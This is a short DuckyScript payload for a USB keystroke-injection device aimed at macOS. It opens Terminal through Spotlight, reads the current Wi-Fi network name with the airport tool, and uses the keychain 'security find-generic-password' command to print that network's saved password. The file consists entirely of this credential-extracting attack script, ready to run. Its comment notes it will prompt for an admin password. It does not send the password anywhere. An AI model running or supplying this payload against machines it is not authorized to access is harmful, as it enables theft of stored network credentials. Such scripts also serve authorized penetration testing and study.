REM Extract WiFi password for current network (macOS)
REM Will prompt for admin password in Terminal
DEFAULT_DELAY 100
DELAY 500
COMMAND SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 2000
STRING SSID=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}') && echo "Current SSID: $SSID" && security find-generic-password -ga "$SSID" -w 2>&1
ENTER
